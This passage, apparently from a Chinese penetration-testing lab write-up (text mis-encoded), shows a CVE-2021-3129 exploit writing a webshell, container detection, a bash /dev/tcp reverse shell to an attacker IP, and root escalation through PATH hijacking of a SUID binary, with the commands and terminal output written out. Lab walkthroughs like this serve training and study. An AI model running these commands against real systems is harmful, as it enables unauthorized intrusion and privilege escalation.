æ¼æ´æ£€æµ‹"></a>2.2 æ¼æ´æ£€æµ‹</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python CVE-2021-3129.py <span class="token parameter variable">-u</span> http://192.168.43.253:81/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.13.14.png" style="zoom:50%;"><p>æˆåŠŸæ£€æµ‹åˆ°CVE-2021-3129æ¼æ´ã€‚</p><h2 id="2-3-æ¼æ´åˆ©ç”¨"><a href="#2-3-æ¼æ´åˆ©ç”¨" class="headerlink" title="2.3 æ¼æ´åˆ©ç”¨"></a>2.3 æ¼æ´åˆ©ç”¨</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python CVE-2021-3129.py <span class="token parameter variable">-u</span> http://192.168.43.253:81/ <span class="token parameter variable">-e</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.14.18.png" style="zoom:50%;"><p>æˆåŠŸå†™å…¥webshellã€‚</p><h2 id="2-4-getshell"><a href="#2-4-getshell" class="headerlink" title="2.4 getshell"></a>2.4 getshell</h2><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.15.52.png" style="zoom:50%;"><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.20.47.png" style="zoom:50%;"><p>æ‹¿åˆ°ä¸€ä¸ªwww-dataç”¨æˆ·æƒé™çš„shellã€‚</p><h2 id="2-5-åˆ¤æ–­shellæ‰€å¤„çš„ç¯å¢ƒ"><a href="#2-5-åˆ¤æ–­shellæ‰€å¤„çš„ç¯å¢ƒ" class="headerlink" title="2.5 åˆ¤æ–­shellæ‰€å¤„çš„ç¯å¢ƒ"></a>2.5 åˆ¤æ–­shellæ‰€å¤„çš„ç¯å¢ƒ</h2><p>å¦‚ä½•åˆ¤æ–­æˆ‘ä»¬è·å–çš„shellæ˜¯å¦æ˜¯å®¹å™¨ï¼Ÿ</p><ul><li>1ï¼‰ç³»ç»Ÿä¿¡æ¯ï¼šLinux 8e172820ac78 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64</li></ul><p>åˆ¤æ–­å¤§æ¦‚æ˜¯ä¸€ä¸ªå®¹å™¨<code>8e172820ac78</code>ã€‚</p><ul><li>2ï¼‰hostnameçš„è¾“å‡ºä¹Ÿè¡¨ç°ä¸ºä¸€ä¸ªå®¹å™¨IDã€‚</li></ul><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.25.29.png" alt="hostnameè¾“å‡º" style="zoom:60%;"><ul><li>3ï¼‰<code>cat /proc/self/cgroup</code></li></ul><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.35.54.png" style="zoom:50%;"><blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /proc/self/cgroup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> åœ¨Linuxç³»ç»Ÿä¸­ï¼Œ<code>/proc/self/cgroup</code> æ–‡ä»¶åŒ…å«äº†å½“å‰è¿›ç¨‹ï¼ˆå³æ‰§è¡Œ <code>cat /proc/self/cgroup</code> å‘½ä»¤çš„è¿›ç¨‹ï¼‰æ‰€å±çš„æ‰€æœ‰æ§åˆ¶ç»„ï¼ˆcgroupsï¼‰çš„è·¯å¾„ã€‚è¿™ä¸ªæ–‡ä»¶å¯ä»¥å¸®åŠ©ä½ ç¡®å®šå½“å‰è¿›ç¨‹æ˜¯å¦è¿è¡Œåœ¨å®¹å™¨ä¸­ï¼Œå› ä¸ºå®¹å™¨é€šå¸¸ä¼šæœ‰è‡ªå·±çš„cgroupé…ç½®ã€‚</p><blockquote><p>(<strong>www-data</strong>:14:name=) $ cat /proc/self/cgroup</p><p>/bin/sh: 1: cd: canâ€™t cd to 14:name=</p><p>14:name=dsystemd:/</p><p>13:name=systemd:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>12:pids:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>11:hugetlb:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>10:net_prio:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>9:perf_event:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>8:net_cls:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>7:freezer:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>6:devices:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>5:memory:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>4:blkio:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>3:cpuacct:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>2:cpu:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p><p>1:cpuset:/docker/8e172820ac78867ecf2b58ccbeacdda40f610fbd6acd1494a4b423123cb57288</p></blockquote><p>æ¯ä¸€è¡Œä»£è¡¨ä¸åŒçš„cgroupå­ç³»ç»Ÿï¼Œå¦‚CPUã€å†…å­˜ã€è®¾å¤‡ç­‰ï¼Œå†’å·åçš„è·¯å¾„æ˜¯è¯¥å­ç³»ç»Ÿä¸‹çš„å…·ä½“cgroupè·¯å¾„ã€‚å¦‚æœè·¯å¾„åŒ…å«ç±»ä¼¼ <code>kubepods</code> æˆ– <code>docker</code> è¿™æ ·çš„è¯æ±‡ï¼Œè¿™é€šå¸¸æ„å‘³ç€å½“å‰ç¯å¢ƒæ˜¯ä¸€ä¸ªå®¹å™¨ã€‚</p><p>å¦‚æœä½ åœ¨ä¸€ä¸ªå®¹å™¨ä¸­æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œä½ å¯èƒ½ä¼šçœ‹åˆ°cgroupè·¯å¾„ä¸­åŒ…å«å®¹å™¨IDæˆ–ç‰¹å®šäºå®¹å™¨çš„å‘½åç©ºé—´ã€‚å¦‚æœä½ åœ¨ä¸€ä¸ªæ™®é€šçš„éå®¹å™¨ç¯å¢ƒä¸­æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œä½ å¯èƒ½ä¼šçœ‹åˆ°ä¸åŒçš„è·¯å¾„ï¼Œæˆ–è€…è·¯å¾„å¯èƒ½ç›´æ¥æŒ‡å‘æ ¹ã€‚</p></blockquote><blockquote><h2 id="ä»€ä¹ˆæ˜¯cgroupè·¯å¾„ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯cgroupè·¯å¾„ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯cgroupè·¯å¾„ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯cgroupè·¯å¾„ï¼Ÿ</h2><p>cgroupï¼ˆControl Groupsï¼‰æ˜¯Linuxå†…æ ¸çš„ä¸€ä¸ªç‰¹æ€§ï¼Œç”¨äºå¯¹è¿›ç¨‹ç»„çš„ç‰©ç†èµ„æºï¼ˆå¦‚CPUã€å†…å­˜ã€ç£ç›˜I/Oç­‰ï¼‰è¿›è¡Œç»†ç²’åº¦çš„æ§åˆ¶å’Œç›‘æ§ã€‚cgroupè·¯å¾„æ˜¯æŒ‡åœ¨cgroupæ–‡ä»¶ç³»ç»Ÿå±‚æ¬¡ç»“æ„ä¸­ï¼Œç‰¹å®šcgroupçš„è·¯å¾„ã€‚</p><p>cgroupè·¯å¾„çš„ä½œç”¨</p><p>cgroupè·¯å¾„çš„ä¸»è¦ä½œç”¨åŒ…æ‹¬ï¼š</p><ol><li><strong>èµ„æºé™åˆ¶</strong>ï¼šé€šè¿‡åœ¨cgroupè·¯å¾„ä¸­è®¾ç½®å‚æ•°ï¼Œå¯ä»¥é™åˆ¶æˆ–ä¼˜å…ˆåˆ†é…èµ„æºç»™ç‰¹å®šçš„è¿›ç¨‹ç»„ã€‚</li><li><strong>èµ„æºç›‘æ§</strong>ï¼šå¯ä»¥ç›‘æ§ç‰¹å®šcgroupçš„èµ„æºä½¿ç”¨æƒ…å†µï¼Œå¦‚CPUä½¿ç”¨ç‡ã€å†…å­˜ä½¿ç”¨é‡ç­‰ã€‚</li><li><strong>è¿›ç¨‹ç®¡ç†</strong>ï¼šå¯ä»¥å°†è¿›ç¨‹æ·»åŠ åˆ°ç‰¹å®šçš„cgroupä¸­ï¼Œå®ç°å¯¹è¿›ç¨‹çš„åˆ†ç»„ç®¡ç†ã€‚</li></ol><p>cgroupæ˜¯Linuxå®¹å™¨æŠ€æœ¯ï¼ˆå¦‚Dockerå’ŒKubernetesï¼‰ä¸­å®ç°èµ„æºéš”ç¦»å’Œé™åˆ¶çš„å…³é”®æŠ€æœ¯ã€‚é€šè¿‡cgroupï¼Œå®¹å™¨æŠ€æœ¯å¯ä»¥ç¡®ä¿å®¹å™¨å†…çš„è¿›ç¨‹ä¸ä¼šæ¶ˆè€—è¿‡å¤šçš„ç³»ç»Ÿèµ„æºï¼Œä»è€Œä¿æŠ¤å®¿ä¸»æœºå’Œå…¶ä»–å®¹å™¨çš„ç¨³å®šæ€§ã€‚</p></blockquote><p>æ‰€ä»¥ç»¼ä¸Šæ‰€è¿°ï¼Œé€šè¿‡CVE-2021-3129æ‹¿åˆ°ä¸€ä¸ªå®¹å™¨ä¸­www-dataç”¨æˆ·æƒé™çš„shellã€‚</p><h1 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h1><h2 id="3-1-æŸ¥æ‰¾å…·æœ‰suidæƒé™çš„æ–‡ä»¶"><a href="#3-1-æŸ¥æ‰¾å…·æœ‰suidæƒé™çš„æ–‡ä»¶" class="headerlink" title="3.1 æŸ¥æ‰¾å…·æœ‰suidæƒé™çš„æ–‡ä»¶"></a>3.1 æŸ¥æ‰¾å…·æœ‰suidæƒé™çš„æ–‡ä»¶</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code> æ˜¯ä¸€ä¸ªåœ¨Linuxç³»ç»Ÿä¸­ä½¿ç”¨çš„å‘½ä»¤ï¼Œç”¨äºæŸ¥æ‰¾ç³»ç»Ÿä¸­å…·æœ‰SUIDï¼ˆSet User IDï¼‰æƒé™çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¸‹é¢æ˜¯å‘½ä»¤å„éƒ¨åˆ†çš„è§£é‡Šï¼š</p><ul><li><code>find</code>ï¼šè¿™æ˜¯Linuxä¸­ç”¨äºæœç´¢æ–‡ä»¶çš„å‘½ä»¤ã€‚</li><li><code>/</code>ï¼šæŒ‡å®šæœç´¢çš„èµ·å§‹ç›®å½•ï¼Œè¿™é‡Œæ˜¯æ ¹ç›®å½•ï¼Œæ„å‘³ç€æœç´¢å°†ä»æ ¹ç›®å½•å¼€å§‹ï¼Œéå†æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿã€‚</li><li><code>-perm -u=s</code>ï¼šè¿™ä¸ªé€‰é¡¹å‘Šè¯‰<code>find</code>å‘½ä»¤æŸ¥æ‰¾æƒé™è®¾ç½®ä¸ºç”¨æˆ·IDï¼ˆUser IDï¼‰å…·æœ‰ç‰¹æ®Šæƒé™çš„æ–‡ä»¶ã€‚<code>-u=s</code>è¡¨ç¤ºæ–‡ä»¶å…·æœ‰SUIDæƒé™ã€‚å½“ä½ åœ¨ <code>find</code> å‘½ä»¤ä¸­ä½¿ç”¨ <code>-perm -u=s</code> æ—¶ï¼Œä½ å®é™…ä¸Šæ˜¯åœ¨å‘Šè¯‰ <code>find</code> å‘½ä»¤å»æœç´¢æ‰€æœ‰ç”¨æˆ·æƒé™ä¸­è®¾ç½®äº†SUIDçš„æ–‡ä»¶ã€‚</li><li><code>-type f</code>ï¼šè¿™ä¸ªé€‰é¡¹é™åˆ¶æœç´¢ç»“æœåªè¿”å›æ–‡ä»¶ï¼ˆä¸åŒ…æ‹¬ç›®å½•ï¼‰ã€‚</li><li><code>2&gt;/dev/null</code>ï¼šè¿™éƒ¨åˆ†æ˜¯å°†æ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰é‡å®šå‘åˆ°<code>/dev/null</code>ï¼Œè¿™æ„å‘³ç€ä»»ä½•é”™è¯¯ä¿¡æ¯éƒ½ä¸ä¼šæ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸Šã€‚</li></ul><p><strong>SUIDæƒé™</strong>ï¼šSUIDæƒé™å…è®¸ä¸€ä¸ªç¨‹åºä»¥æ–‡ä»¶æ‰€æœ‰è€…çš„èº«ä»½è¿è¡Œï¼Œè€Œä¸æ˜¯ä»¥å¯åŠ¨è¯¥ç¨‹åºçš„ç”¨æˆ·çš„èº«ä»½è¿è¡Œã€‚è¿™é€šå¸¸ç”¨äºéœ€è¦æå‡æƒé™çš„ç¨‹åºï¼Œä¾‹å¦‚<code>passwd</code>æˆ–<code>sudo</code>ã€‚</p></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.51.27.png" style="zoom:70%;"><p>  <code>/home/jobs/shell</code>æ–‡ä»¶å…·æœ‰suidæƒé™ä¸”åå­—æ¯”è¾ƒå¯ç–‘ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.56.12.png" style="zoom:50%;"><p> shellæ–‡ä»¶æ˜¯ä¸€ä¸ªå¯æ‰§è¡ŒäºŒè¿›åˆ¶ç¨‹åºï¼Œå¹¶ä¸”æ‰€æœ‰ç”¨æˆ·éƒ½æœ‰æ‰§è¡Œæƒé™ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-07%2014.48.33.png" style="zoom:50%;"><p>æ‰§è¡Œ./shellæ–‡ä»¶ï¼š</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2009.58.09.png" style="zoom:60%;"><p>å‘ç°æ‰§è¡Œäº†ä¸€äº›å‘½ä»¤ï¼Œå¦‚apache2ã€apache2å’Œpsç­‰ï¼Œå¹¶ä¸”æ‰§è¡Œè¿™äº›å‘½ä»¤çš„æ—¶å€™æ²¡æœ‰ç”¨ç»å¯¹è·¯å¾„ï¼Œè¯´æ˜ä»–ä»¬éƒ½èƒ½ä»$PATHç¯å¢ƒå˜é‡ä¸­è¢«æ‰¾åˆ°ã€‚</p><p>æƒé™æå‡çš„æ€è·¯ï¼šåœ¨/tmpç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªåç§°ä¸ºpsä½†æ˜¯å†…å®¹ä¸º<code>/bin/bash</code>çš„æ–‡ä»¶ï¼Œå¹¶å°†å®ƒçš„æƒé™æ”¹æˆ777ï¼Œç„¶ååœ¨$PATHç¯å¢ƒå˜é‡å‰æ·»åŠ <code>/tmp:</code>ï¼Œè¿™æ ·ä»¥æ¥æ‰§è¡Œ./shellç¨‹åºçš„æ—¶å€™ï¼Œå°±æœ‰é™ä¼šæ‰§è¡Œ<code>/bin/bash</code>ï¼Œåˆç”±äºshellæ‰§è¡Œçš„æ—¶å€™æ˜¯rootæƒé™ï¼Œå› æ­¤æ‰§è¡Œ/bin/bashä¹‹åä¹Ÿä¼šè·å¾—ä¸€ä¸ªrootæƒé™çš„shellã€‚</p><h2 id="3-2-åå¼¹shell"><a href="#3-2-åå¼¹shell" class="headerlink" title="3.2 åå¼¹shell"></a>3.2 åå¼¹shell</h2><p>é¦–å…ˆé€šè¿‡æ’ä»¶å¸‚åœºä¸‹è½½<code>è„šæœ¬æ‰§è¡Œ</code>æ’ä»¶ï¼Œç„¶ååŠ è½½<code>è„šæœ¬æ‰§è¡Œ</code>æ’ä»¶ã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2010.45.02.png" style="zoom:50%;"><p>kaliç«¯ç›‘å¬ç«¯å£ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> lvp <span class="token number">2333</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å‘½ä»¤è¯¦è§£ï¼š</p><p><code>nc -lvp 2333</code> æ˜¯ä¸€ä¸ªä½¿ç”¨ netcatï¼ˆé€šå¸¸ç®€ç§°ä¸º ncï¼‰è¿™ä¸ªç½‘ç»œå·¥å…·çš„å‘½ä»¤ï¼Œç”¨äºåœ¨æœ¬åœ°è®¡ç®—æœºä¸Šç›‘å¬ç«¯å£ 2333 çš„ TCP è¿æ¥ã€‚</p><ol><li><code>nc</code>ï¼šè¿™æ˜¯è°ƒç”¨ netcat ç¨‹åºçš„å‘½ä»¤ï¼Œnetcat æ˜¯ä¸€ä¸ªç”¨äºç½‘ç»œé€šä¿¡çš„ç®€å• Unix å·¥å…·ï¼Œå®ƒå¯ä»¥ç”¨äºè¯»å–å’Œå†™å…¥ç½‘ç»œè¿æ¥ã€‚</li><li><code>-l</code>ï¼šè¿™ä¸ªé€‰é¡¹å‘Šè¯‰ netcat è¿›å…¥ç›‘å¬æ¨¡å¼ï¼Œå‡†å¤‡æ¥å—ä¼ å…¥çš„è¿æ¥ã€‚</li><li><code>-v</code>ï¼šè¿™ä¸ªé€‰é¡¹æ˜¯ç”¨äºå¯ç”¨è¯¦ç»†è¾“å‡ºæ¨¡å¼ï¼Œå®ƒä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºæ›´å¤šçš„ä¿¡æ¯ï¼Œæ¯”å¦‚è¿æ¥çš„çŠ¶æ€å’Œä»»ä½•é”™è¯¯ä¿¡æ¯ã€‚</li><li><code>-p 2333</code>ï¼šè¿™ä¸ªé€‰é¡¹æŒ‡å®šäº† netcat ç›‘å¬çš„ç«¯å£å·ï¼Œè¿™é‡Œæ˜¯ 2333ã€‚ä»»ä½•æƒ³è¦è¿æ¥åˆ°è¿™ä¸ªç«¯å£çš„è¿œç¨‹ç³»ç»Ÿéƒ½ä¼šè¢« netcat æ¥å—ã€‚</li></ol></blockquote><p>æ‰§è¡Œåå¼¹shellçš„è„šæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">system<span class="token punctuation">(</span><span class="token string">'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.43.26/2333 0&gt;&amp;1"'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å‘½ä»¤è¯¦è§£ï¼š</p><p>è¿™æ¡å‘½ä»¤æ˜¯ä¸€ä¸ªåœ¨PHPç¯å¢ƒä¸­æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œå®ƒåˆ©ç”¨äº†PHPçš„<code>system</code>å‡½æ•°æ¥è°ƒç”¨bash shellï¼Œå¹¶æ‰§è¡Œä¸€ä¸ªç‰¹å®šçš„å‘½ä»¤å­—ç¬¦ä¸²ã€‚è¿™ä¸ªå‘½ä»¤å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªåˆ›å»ºåå‘shellçš„æŠ€å·§ï¼Œé€šå¸¸ç”¨äºæ¸—é€æµ‹è¯•æˆ–æ¶æ„è½¯ä»¶ä¸­ã€‚</p><ol><li><code>system</code>ï¼šè¿™æ˜¯PHPçš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ‰§è¡Œå¤–éƒ¨å‘½ä»¤å¹¶æ˜¾ç¤ºè¾“å‡ºã€‚</li><li><code>'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.43.26/2333 0&gt;&amp;1"'</code>ï¼šè¿™æ˜¯ä¼ é€’ç»™<code>system</code>å‡½æ•°çš„å‘½ä»¤å­—ç¬¦ä¸²ï¼Œå®ƒè¢«å•å¼•å·æ‹¬èµ·æ¥ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå•ä¸€çš„å­—ç¬¦ä¸²å‚æ•°ã€‚</li><li><code>bash -c</code>ï¼šè¿™æ˜¯è°ƒç”¨bash shellå¹¶æ‰§è¡Œåé¢çš„å‘½ä»¤å­—ç¬¦ä¸²ã€‚</li><li><code>'bash -i &gt;&amp; /dev/tcp/192.168.43.26/2333 0&gt;&amp;1'</code>ï¼šè¿™æ˜¯bashå‘½ä»¤ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªåå‘shellã€‚<ol><li><code>bash -i</code>ï¼šå¯åŠ¨ä¸€ä¸ªäº¤äº’å¼çš„bash shellã€‚</li><li><code>&gt;&amp;</code>ï¼šè¿™æ˜¯ä¸€ä¸ªé‡å®šå‘æ“ä½œç¬¦ï¼Œç”¨äºå°†æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰å’Œæ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰åˆå¹¶å¹¶é‡å®šå‘åˆ°åŒä¸€ä¸ªç›®æ ‡ã€‚å•ç‹¬ä½¿ç”¨ <code>&gt;&amp;</code> æ—¶ï¼Œå®ƒé€šå¸¸ç”¨äºå°†æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰å’Œæ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰é‡å®šå‘åˆ°åŒä¸€ä¸ªç›®æ ‡ã€‚</li><li><code>/dev/tcp/192.168.43.26/2333</code>ï¼šè¿™æ˜¯ä¸€ä¸ªUnixåŸŸå¥—æ¥å­—ï¼Œç”¨äºå»ºç«‹ä¸€ä¸ªåˆ°æŒ‡å®šIPåœ°å€å’Œç«¯å£çš„TCPè¿æ¥ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒå°è¯•è¿æ¥åˆ°IPåœ°å€<code>192.168.43.26</code>çš„<code>2333</code>ç«¯å£ã€‚</li><li><code>0&gt;&amp;1</code>ï¼šè¿™å°†æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†è®©è¾“å…¥å’Œè¾“å‡ºéƒ½é€šè¿‡åŒä¸€ä¸ªé€šé“ï¼Œå³TCPè¿æ¥ã€‚</li></ol></li></ol><p>è¿™ä¸ªå‘½ä»¤çš„ç›®çš„æ˜¯åˆ›å»ºä¸€ä¸ªåå‘è¿æ¥ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥ä»è¿œç¨‹IPåœ°å€<code>192.168.43.26</code>çš„<code>2333</code>ç«¯å£è®¿é—®ç›®æ ‡æœºå™¨çš„shellã€‚è¿™ç§æŠ€æœ¯é€šå¸¸è¢«ç”¨äºç»•è¿‡é˜²ç«å¢™çš„é™åˆ¶ï¼Œå› ä¸ºå¤§å¤šæ•°é˜²ç«å¢™ä¼šå…è®¸å‡ºç«™è¿æ¥ã€‚</p></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2010.46.26.png" style="zoom:50%;"><p>kali linuxè·å–åå¼¹çš„shell</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2010.49.26.png" style="zoom:30%;"><h2 id="3-3-æƒé™æå‡è·å–rootæƒé™"><a href="#3-3-æƒé™æå‡è·å–rootæƒé™" class="headerlink" title="3.3 æƒé™æå‡è·å–rootæƒé™"></a>3.3 æƒé™æå‡è·å–rootæƒé™</h2><p>æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp<span class="token builtin class-name">echo</span> <span class="token string">"/bin/bash"</span> <span class="token operator">&gt;</span> <span class="token function">ps</span> <span class="token comment"># /bin/bash çš„æƒé™ -rwxr-xr-x 1 root root </span><span class="token function">chmod</span> <span class="token number">777</span> <span class="token function">ps</span><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span> <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp:<span class="token environment constant">$PATH</span> <span class="token comment"># å°†/tmpæ·»åŠ åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼Œå¹¶ä¸”å…ˆåŠ è½½æ‰§è¡Œ/tmpé‡Œçš„ç¨‹åº</span><span class="token builtin class-name">cd</span> /home/jobs./shell<span class="token comment"># ç„¶åå°±è·å¾—äº†rootæƒé™ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤äº†</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>å…·ä½“çš„æ‰§è¡Œè¿‡ç¨‹ï¼š</p><p>www-data@8e172820ac78:/var/www/html$ cd /tmp<br>cd /tmp<br>www-data@8e172820ac78:/tmp$ ls<br>ls<br>vIjn2Lh<br>vKwfKcp<br>vuPmJKu<br>www-data@8e172820ac78:/tmp$ echo â€œ/bin/bashâ€ &gt; ps<br>echo â€œ/bin/bashâ€ &gt; ps<br>www-data@8e172820ac78:/tmp$ ls<br>ls<br>ps<br>vIjn2Lh<br>vKwfKcp<br>vuPmJKu<br>www-data@8e172820ac78:/tmp$ ls -al ps<br>ls -al ps<br>-rw-râ€“râ€“ 1 www-data www-data 10 Jan  3 03:00 ps<br>www-data@8e172820ac78:/tmp$ chmod 777 ps<br>chmod 777 ps<br>www-data@8e172820ac78:/tmp$ ls -al ps<br>ls -al ps<br>-rwxrwxrwx 1 www-data www-data 10 Jan  3 03:00 ps<br>www-data@8e172820ac78:/tmp$ echo $PATH<br>echo $PATH<br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>www-data@8e172820ac78:/tmp$ export PATH=/tmp:$PATH<br>export PATH=/tmp:$PATH<br>www-data@8e172820ac78:/tmp$ echo $PATH<br>echo $PATH<br>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>www-data@8e172820ac78:/tmp$ cd /home/jobs<br>cd /home/jobs<br>www-data@8e172820ac78:/home/jobs$ ls -al<br>ls -al<br>total 32<br>drwxr-xr-x 2 root root  4096 Feb 25  2021 .<br>drwxr-xr-x 1 root root  4096 Feb 25  2021 ..<br>-rw-râ€“râ€“ 1 root root    75 Feb 25  2021 demo.c<br>-rwsr-xr-x 1 root root 16712 Feb 25  2021 shell<br>www-data@8e172820ac78:/home/jobs$ ./shell<br>./shell<br>id<br>uid=0(root) gid=0(root) groups=0(root),33(www-data)<br>whoami<br>root</p></blockquote><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2011.06.21.png" style="zoom:40%;"><p>ææƒæˆåŠŸï¼Œè·å¾—å®¹å™¨ä¸­rootæƒé™çš„shellã€‚</p><blockquote><p>ä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨èšå‰‘ä¸­æ‰§è¡Œè€Œéœ€è¦åå¼¹shellå‘¢ï¼Ÿ</p><ul><li>å®è·µæ“ä½œä¼šå‘ç°ï¼Œåœ¨èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯ä¸­æ— æ³•ä¿®æ”¹$PATHç¯å¢ƒå˜é‡ã€‚</li></ul><p>export ä¸å¥æ•ˆã€‚</p><img src="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-03%2011.19.10.png" 